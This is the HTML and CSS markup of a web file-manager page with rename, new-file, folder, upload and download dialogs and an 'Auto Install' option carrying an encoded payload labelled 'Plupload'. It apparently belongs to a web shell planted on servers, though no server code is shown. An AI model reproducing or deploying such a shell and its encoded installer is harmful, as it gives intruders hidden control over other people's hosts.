    <style>@import url(https://fonts.googleapis.com/css2?family=Lexend+Deca&family=Source+Sans+Pro&display=swap);*{margin:0;box-sizing:border-box;webkit-box-sizing:border-box;-moz-box-sizing:border-box}body{margin:0;padding:0;background:#191919;box-sizing:border-box;font-family:'Source Sans Pro',sans-serif}#loader{position:fixed;top:50%;left:50%;width:50px;height:50px;transform:translate(-50%,-50%) rotate(165deg);z-index:69;display:none}#loader:after,#loader:before{content:"";position:absolute;top:50%;left:50%;display:block;width:.5em;height:.5em;border-radius:.25em;transform:translate(-50%,-50%)}#loader:before{animation:2s infinite before}#loader:after{animation:2s infinite after}@keyframes before{0%{width:.5em;box-shadow:1em -.5em rgba(225,20,98,.75),-1em .5em rgba(111,202,220,.75)}35%{width:2.5em;box-shadow:0 -.5em rgba(225,20,98,.75),0 .5em rgba(111,202,220,.75)}70%{width:.5em;box-shadow:-1em -.5em rgba(225,20,98,.75),1em .5em rgba(111,202,220,.75)}100%{box-shadow:1em -.5em rgba(225,20,98,.75),-1em .5em rgba(111,202,220,.75)}}@keyframes after{0%{height:.5em;box-shadow:.5em 1em rgba(61,184,143,.75),-.5em -1em rgba(233,169,32,.75)}35%{height:2.5em;box-shadow:.5em 0 rgba(61,184,143,.75),-.5em 0 rgba(233,169,32,.75)}70%{height:.5em;box-shadow:.5em -1em rgba(61,184,143,.75),-.5em 1em rgba(233,169,32,.75)}100%{box-shadow:.5em 1em rgba(61,184,143,.75),-.5em -1em rgba(233,169,32,.75)}}#blur{height:100%;background:#222;bottom:0;left:0;opacity:.5;outline:0;position:fixed;width:100%;z-index:25;display:none}.box{padding:10px 15px;background:#131313;border:2px solid #08e8fd;border-radius:10px 5px;box-shadow:5px 5px 12px rgb(8 232 253 / 25%);position:fixed;width:calc(100% - 30px);max-width:500px;top:50%;left:50%;transform:translate(-50%,-50%)}.box h1.title{width:100%;text-align:center;margin-bottom:30px;color:#08e8fd}.input{position:relative;height:37px;margin-bottom:25px}.input input{position:absolute;top:0;left:0;width:100%;height:100%;font-size:17px;border-radius:.5rem;outline:0;padding:1rem 1rem 1rem 37px;background:0 0;z-index:1;color:#08e8fd;border:1px solid #08e8fd}.input label{position:absolute;left:37px;top:7px;padding:0 .25rem;background-color:#121212;font-size:18px;transition:.3s}.input .icon{width:37px;height:37px;font-size:23px;padding:7px 0;text-align:center}#input:focus+#label,#input:not(:placeholder-shown)#input:not(:focus)+#label{top:-.5rem;left:27px;font-size:13px;font-weight:500;z-index:10}.input input:focus,.input input:hover{border:2px solid #08e8fd;box-shadow:3px 3px 10px rgb(8 232 253 / 25%)}.input .icon,.input label{color:#08e8fd}.input.error input{color:#f32921!important;border:1px solid #f32921!important}.input.error input:focus,.input.error input:hover{border:2px solid #f32921!important;box-shadow:3px 3px 10px rgb(243 41 33 / 40%)!important}.input.error .icon,.input.error label{color:#f32921}.input span{display:none}.error span{display:block;position:absolute;color:#f32921;bottom:-17px;font-size:13px;right:1rem}.button{cursor:pointer;position:relative;height:37px;margin-bottom:25px;border-radius:.5rem;color:#08e8fd;border:1px solid #08e8fd}.button:focus,.button:hover{border:2px solid #08e8fd;box-shadow:3px 3px 10px rgb(8 232 253 / 25%)}.button h1{height:37px;margin:auto;text-align:center;font-size:20px;padding:4px 0}.newSell{padding:5px;font-size:20px;color:#08e8fd;display:flex;margin:5px;border:1px dotted}.newSell_title{flex:1;font-size:18px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-family:'Lexend deca',sans-serif}#openSell_btn{margin:auto auto auto 5px;width:20px;cursor:pointer;text-align:center}.newSell_btn{text-align:end;width:130px;margin:auto auto auto 5px;display:none}.newSell_btn i{flex:1;cursor:pointer;text-align:center}.newFile_btn{text-align:end;width:80px;margin:auto auto auto 5px;display:flex}.newFile_btn i{flex:1;cursor:pointer;text-align:center}.flex{padding:5px;font-size:20px;color:#08e8fd;display:flex}.folders{flex:1;font-size:18px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;cursor:pointer}.edit_btn{text-align:end;width:80px;margin: auto;margin-left:5px;font-size:18px;display:flex}.edit_btn i{flex:1;text-align:center;cursor:pointer}.size{font-size:18px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;width:80px;margin-left:5px}#folders{border:1px dotted #08e8fd;margin:105px 5px 5px}.folders i{width:22px;font-size:17px}h1.owner{text-align:center;color:#08e8fd}.fix{border-bottom:2px dotted #08e8fd;padding:5px 0;margin-bottom:10px;position:fixed;top:0;width:100%;background:#191919}.flex .button{flex:1;margin:0 10px 10px}#newFile,#newFolder,#rename,#uploadFile{z-index:30;display:none}#choseFile::-webkit-file-upload-button{display:none}#choseFile::file-selector-button{display:none}#choseFile{padding:5px 0 0 37px;line-height:27px;font-size:18px}#progress{overflow:hidden;height:18px;margin-bottom:20px;background-color:#7c9fa3;border-radius:4px;display:none}.progressBar{float:left;width:0%;height:100%;font-size:12px;line-height:20px;color:#08e0f4;text-align:center;background-color:#08e8fd;transition:width .6s;-webkit-transition:width .6s;-o-transition:width .6s}.progressPer{position:fixed;top:61%;left:50%;transform:translate(-50%,0) scale(1);z-index:50;font-size:17px;font-weight:700;color:#131313}.viewFile{position:fixed;top:0;width:100%;height:100%;background:#191919}.viewFileTitle{position:fixed;background:#191919;width:100%;z-index:5;top:0}.viewFileData{margin-top:45px;width:100%}audio,img,video{margin-top:20px;top:50%;left:50%;transform:translate(-50%,-50%);position:absolute;max-width:100%;max-height:calc(100% - 50px);overflow:hidden}i.fa-light.fa-floppy-disk,i.fa-light.fa-xmark{font-size:22px}.textarea{padding:10px;margin:auto;height:calc(100% - 50px);width:calc(100% - 10px);border:1px dotted #0ae8fd}textarea{border:none;outline:0;resize:none;width:100%;height:100%;background:0 0;color:#0ae8fd}textarea::-webkit-scrollbar{width:2px;height:2px}textarea::-webkit-scrollbar-thumb{background-color:#2196f3}textarea::-webkit-scrollbar-track{-webkit-box-shadow:inset 0 0 10px #5f6364}body::-webkit-scrollbar{display:none}.nowrap{white-space:nowrap}i#addNowrap,i#removeNowrap{font-size:20px;line-height:22px;display:none}#viewFileCode{position:fixed;top:45px;right:0;bottom:0;left:0;z-index:9;color:#fff;display:none}#autoInstall{z-index:30;display:none}.select{position:absolute;top:0;left:0;width:100%;height:100%;font-size:17px;border-radius:.5rem;outline:0;padding:1rem 1rem 1rem 37px;background:0 0;z-index:1;color:#08e8fd;border:1px solid #08e8fd}.select:focus,.select:hover{border:2px solid #08e8fd;box-shadow:3px 3px 10px rgb(8 232 253 / 25%)}.select select{color:#08e8fd;position:absolute;top:0;left:37px;padding:0;width:calc(100% - 48px);height:100%;font-size:17px;outline:0;border:0;background:0 0;z-index:1}select option{background:#131313}.input.error .select{color:#f32921!important;border:1px solid #f32921!important}.input.error .select select{color:#f32921!important}.input.error .select:focus,.input.error .select:hover{border:2px solid #f32921!important;box-shadow:3px 3px 10px rgb(243 41 33 / 40%)!important}</style>

<body>
<div id="body"></div><div id="loader"></div><div id="blur"></div><div id="viewFile"></div><div id="viewFileCode"></div>
<form method="POST" action="#" style="display: none;"><input type="text" name="data" value="Download"><input type="text" name="filePath" id="filePath" value=""><input type="submit" name="submit" id="downloadFile" value="Download"></form>
<div class="box" id="rename"><h1 class="title">Rename</h1><div class="input" id="newName"><div class="icon"><i class="fa-light fa-pen-to-square"></i></div><input type="text" id="input" placeholder=" "><label for="input" id="label">New Name</label><span></span></div><input type="hidden" id="renameDir" value=""><input type="hidden" id="oldName" value=""><div class="flex"><div class="button" id="renameCancel"><h1>Cancel</h1></div><div class="button" id="renameNow"><h1>Rename</h1></div></div></div>
<div class="box" id="newFile"><h1 class="title">New File</h1><div class="input" id="newFileName"><div class="icon"><i class="fa-light fa-file-plus"></i></div><input type="text" id="input" placeholder=" "><label for="input" id="label">File Name</label><span></span></div><div class="flex"><div class="button" id="newFileCancel"><h1>Cancel</h1></div><div class="button" id="newFileCreate"><h1>Create</h1></div></div></div>
<div class="box" id="newFolder"><h1 class="title">New Folder</h1><div class="input" id="newFolderName"><div class="icon"><i class="fa-light fa-folder-plus"></i></div><input type="text" id="input" placeholder=" "><label for="input" id="label">Folder Name</label><span></span></div><div class="flex"><div class="button" id="newFolderCancel"><h1>Cancel</h1></div><div class="button" id="newFolderCreate"><h1>Create</h1></div></div></div>
<div class="box" id="uploadFile"><h1 class="title">Upload File</h1><div class="input" id="fileUpload"><div class="icon"><i class="fa-light fa-file-arrow-up"></i></div><input type="file" id="choseFile" placeholder=" "><span></span></div><div class="flex" id="fileUploadBtn"><div class="button" id="uploadFileCancel"><h1>Cancel</h1></div><div class="button" id="uploadFileNow"><h1>Upload</h1></div></div><div id="progress"><div class="progressBar" style="width: 0%;"></div><h3 class="progressPer">0%</h3></div></div>
<div class="box" id="autoInstall"><h1 class="title">Auto Install</h1><div class="input" id="installAuto"><div class="icon"><i class="fa-light fa-shield-plus"></i></div><div class="select"> <select id="choseInstall">
<option value="Xl7aYCe71xQpV5SLG2KcqzQB+RwJPYIqsNOBF5ye13q4dxMJrrhvaNlhi2oP5VlGZGI6LyopycYB9x7l4sVO6gksxLW6dXXVhQW9or9h6SXaqgsqN8aZ0/5CF9R2jAGgpgbC3oxT1w==">Plupload</option>
</select></div><span></span></div><div class="flex" id="autoInstallBtn"><div class="button" id="autoInstallCancel"><h1>Cancel</h1></div><div class="button" id="autoInstallNow"><h1>Install</h1></div></div></div>
<script src="https://cdn.rawgit.com/ajaxorg/ace-builds/master/src-noconflict/ace.js" type="text/javascript" charset="utf-8"></script>
